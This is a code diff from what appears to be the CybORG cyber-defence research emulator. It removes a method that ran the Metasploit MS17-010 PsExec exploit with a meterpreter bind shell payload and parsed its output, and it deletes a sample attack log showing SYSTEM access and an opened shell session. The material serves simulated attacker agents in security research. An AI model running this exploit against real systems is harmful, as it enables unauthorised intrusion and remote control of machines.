@@ -113,55 +113,7 @@ class MS17_010_PSExec(RemoteCodeExecution):
         return obs
 
     def emu_execute(self, session_handler) -> Observation:
-        obs = Observation()
-        from cyborg.CybORG import MSFSessionHandler
-        if type(session_handler) is not MSFSessionHandler:
-            obs.set_success(False)
-            return obs
-        output = session_handler.execute_module(mtype='exploit', mname='windows/smb/ms17_010_psexec',
-                                                opts={'RHOSTS': str(self.target), 'SMBUser': self.username,
-                                                      'SMBPass': self.password},
-                                                payload_name='windows/x64/meterpreter/bind_tcp',
-                                                payload_opts={'LPORT': 44444})
-        obs.add_raw_obs(output)
-        obs.set_success(False)
-        # session_handler._log_debug(output)
-        """ Example:
-        [*] 10.0.10.10:445 - Authenticating to 10.0.10.10 as user 'vagrant'...
-        [*] 10.0.10.10:445 - Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1
-        [*] 10.0.10.10:445 - Built a write-what-where primitive...
-        [+] 10.0.10.10:445 - Overwrite complete... SYSTEM session obtained!
-        [*] 10.0.10.10:445 - Selecting PowerShell target
-        [*] 10.0.10.10:445 - Executing the payload...
-        [+] 10.0.10.10:445 - Service start timed out, OK if running a command or non-service executable...
-        [*] Started bind TCP handler against 10.0.10.10:44444
-        [*] Encoded stage with x86/shikata_ga_nai
-        [*] Sending encoded stage (267 bytes) to 10.0.10.10
-        [*] Command shell session 4 opened (10.0.20.245-10.0.10.199:0 -> 10.0.10.10:44444) at 2020-08-14 05:55:41 +0000
-        """
-        for line in output.split(('\n')):
-            if 'Overwrite complete' in line:
-                obs.add_process(hostid=str(self.target), local_address=self.target, local_port=self.port, status="open",
-                                process_type="smb")
-            if '[*] Meterpreter session' in line:
-                obs.set_success(True)
-                # print(list(enumerate(line.split(' '))))
-                split = line.split(' ')
-                session = int(split[3])
-                if '-' in split[5]:
-                    temp = split[5].replace('(', '').split(':')[0]
-                    origin, rip = temp.split('-')
-                    # obs.add_process(remote_address=rip, local_address=origin)
-                    rport = None
-                else:
-                    rip, rport = split[5].replace('(', '').split(':')
-                lip, lport = split[7].replace(')', '').split(':')
-                obs.add_session_info(hostid=str(self.target), session_id=session, session_type='meterpreter',
-                                     agent=self.agent)
-                obs.add_process(hostid=str(self.target), local_address=lip, local_port=lport, remote_address=rip,
-                                remote_port=rport)
-        sleep(5)  # wait for setup of met session
-        return obs
+        raise ValueError("not supported")
 
     def __str__(self):
         return super(MS17_010_PSExec,
